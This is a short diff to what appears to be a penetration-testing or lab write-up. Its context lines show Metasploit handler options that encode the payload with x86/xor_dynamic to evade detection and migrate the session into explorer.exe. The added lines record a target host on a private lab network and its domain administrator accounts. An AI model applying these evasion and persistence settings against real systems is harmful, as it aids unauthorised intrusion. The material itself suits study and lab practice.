@@ -94,3 +94,7 @@ set stageencoder x86/xor_dynamic
 set AutoRunScript migrate -n explorer.exe
 run -j
 ```
+
+####Get into 192.168.141.122 machine, hostname: client
+
+Domain Admins: Administrator and pete
